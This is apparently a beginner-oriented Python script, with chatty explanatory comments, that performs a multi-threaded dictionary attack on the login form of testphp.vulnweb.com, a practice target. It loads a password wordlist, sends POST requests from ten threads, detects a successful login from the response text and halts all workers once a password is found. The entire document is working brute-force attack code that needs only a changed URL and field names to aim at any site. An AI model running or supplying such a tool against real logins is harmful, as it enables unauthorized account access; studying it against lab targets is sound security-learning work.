import requests
import concurrent.futures

target_url = "http://testphp.vulnweb.com/userinfo.php"
target_username = "test"
wordlist_file = "passwords.txt"

# 1. THE GIANT STOP SIGN
# This is our global flag. It starts as False.
password_found = False

# 2. THE WORKER INSTRUCTIONS
# We package our POST request logic into a function, just like the scanner!
def attempt_login(password):
    # Tell Python we want to look at the global stop sign, not make a local one
    global password_found
    
    # If another worker already found the password, just stop and return!
    if password_found:
        return

    # Print what we are trying (This will print FAST now!)
    print(f"[*] Trying: {password}")
    
    login_data = {
        "uname": target_username,
        "pass": password
    }
    
    try:
        # Fire the POST request
        response = requests.post(target_url, data=login_data, timeout=3)
        
        # Check for the Success Indicator
        if "logout" in response.text.lower() or "welcome" in response.text.lower():
            print(f"\n[+] BINGO! SUCCESS! The password is: {password}")
            
            # CHANGE THE STOP SIGN TO TRUE!
            # This tells all other threads to immediately stop attacking.
            password_found = True 
    except requests.exceptions.RequestException:
        pass # Ignore network errors

# 3. LOAD THE AMMUNITION
print(f"[*] Loading ammunition from {wordlist_file}...")
with open(wordlist_file, "r") as file:
    passwords_to_test = [line.strip() for line in file]

print(f"[*] Loaded {len(passwords_to_test)} passwords. Commencing MULTI-THREADED attack...\n")

# 4. EXECUTE THE MULTI-THREADING MAGIC
# The Boss hires 10 workers (max_workers=10) and tells them to start mapping
# the passwords to the 'attempt_login' instructions!
with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    executor.map(attempt_login, passwords_to_test)

# 5. FINAL CHECK
if not password_found:
    print("\n[-] Scan complete. The correct password was not in the list.")